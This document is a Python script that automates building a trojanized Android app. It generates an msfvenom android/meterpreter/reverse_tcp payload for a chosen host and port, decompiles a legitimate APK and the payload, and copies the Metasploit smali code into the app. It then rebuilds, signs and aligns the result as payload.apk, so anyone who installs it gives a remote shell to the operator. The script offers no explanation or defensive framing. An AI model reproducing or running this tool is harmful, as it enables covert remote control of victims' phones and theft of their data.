
import os
import time
import webbrowser
ope_n = input("Do you want to watch an explanatory video? [n/y] => ")
if ope_n == 'y' :
    print()
    webbrowser.open("")
else:
    pass
naem = input('Do you want to create payload? [y/n]=> ')

if naem == 'y' :
     payload = input('Add the host => ')
     payload1 = input('Add the port => ')
     payload3 = input('Payload name => ')
     os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={payload} LPORT={payload1} R > {payload3}')
     os.system(f'mv {payload3} apk')
else:
    pass
print("**********************************************************************")
os.system('ls apk')
print("**********************************************************************")
application = input ("Enter the application name => ")
if application.lower == 'e':
    print('OK')
else:
    os.system(f'apktool d -f apk/{application}.apk')
    time.sleep(3)
    os.system(f'mv {application} apk')
payload0 = input ("\nEnter the payload name => ")
if payload0.lower == 'e' :
    print('OK')
else: 
    os.system(f'apktool d -f apk/{payload0}.apk')
    os.system(f'mv {payload0} apk')
    time.sleep(3)
    os.system(f'cp -r apk/{payload0}/smali/com/metasploit apk/{application}/smali/com/')
no = input("Press n to continue [y/n] => ")
if no == 'y':
    os.system(f'java -jar apk/apktool_2.9.3.jar b apk/{application}')
    time.sleep(2)
    
else:
    pass
yes = input ("Press n to continue [y/n] => ").lower()
if yes == 'y':
    print(f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk/key.keystore apk/{application}/dist/{application}.apk elliot')
    time.sleep(2)
    os.system(f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk/key.keystore apk/{application}/dist/{application}.apk elliot')
    time.sleep(2)
    print()
    print(f'zipalign -v 4 apk/{application}/dist/{application}.apk payload.apk')
    time.sleep(2)
    print()
    os.system(f'zipalign -v 4 apk/{application}/dist/{application}.apk payload.apk')
else:
    pass

